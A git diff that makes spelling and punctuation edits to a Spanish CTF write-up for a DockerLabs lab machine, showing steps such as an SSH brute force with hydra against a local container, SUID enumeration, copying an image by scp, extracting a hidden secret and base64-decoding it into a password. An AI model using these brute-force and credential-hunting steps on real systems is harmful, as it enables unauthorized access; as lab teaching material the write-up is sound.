@@ -60,7 +60,7 @@ Igualmente vemos a ver que tiene la pagina web y se ven reportes donde encontram
 ![Captura de pantalla 2024-05-15 185307](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/2fcf8350-3dcf-4c12-9d5e-532b10445255)
 
 
-Vemos un usuario "juan" despedido asi que nos olvidamos de el y otro llamado "carlota"
+Vemos un usuario "juan" despedido así que nos olvidamos de el y otro llamado "carlota"
 Procedemos a hacer un ataque de fuerza bruta con hydra:
 
 ```shell
@@ -79,7 +79,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-15 18:49:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-15 18:49:47
 ```
 
-Nos encuentra la contraseña asi que procemos a entrar con su usuario:
+Nos encuentra la contraseña así que procemos a entrar con su usuario:
 
 ```shell
 └─$ ssh carlota@172.17.0.2                                                
@@ -87,14 +87,14 @@ carlota@172.17.0.2's password:
 Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.6.9-amd64 x86_64)
 ```
 
-Intente hacer un "sudo -l" y un "find / -perm -4000 -user root 2>/dev/null" pero no hay nada interesante.
+Intente hacer un "sudo -l" y un "find / -perm -4000 -user root 2>/dev/null" pero no hay nada explotable.
 Buscando por los directorios encontramos:
 
 ```shell
 carlota@602e73150064:~/Desktop/fotos/vacaciones$
 ```
 
-Donde hay un archivo ".jpg" y nos lo descargamos en nuestra maquina local
+Donde hay un archivo ".jpg" y nos lo descargamos en nuestra maquina local.
 
 ```shell
 └─$ scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Desktop/Machines/Amor/
@@ -115,14 +115,14 @@ wrote extracted data to "secret.txt".
 ZXNsYWNhc2FkZXBpbnlwb24
 ```
 
-Encontramos algo asi que lo vamos a desencriptar:
+Encontramos algo así que lo vamos a desencriptar:
 
 ```shell
 └─$ echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 --decode
 eslacasadepinypon
 ```
 
-Pensando en que puede ser eso pensé que era una contraseña pero no encontraba otro usuario, intente con el usuario "root" pero nada me meti otra vez al servidor ssh a navegar por los directorios y encontramos un usuario nuevo:
+Pensando en que puede ser eso pensé que era una contraseña pero no encontraba otro usuario, intente con el usuario "root" pero nada, me meti otra vez al servidor ssh a navegar por los directorios y encontramos un usuario nuevo:
 
 ![Captura de pantalla 2024-05-15 185222](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/e3dcba9f-9a7d-435f-9259-6c033cda849b)
 
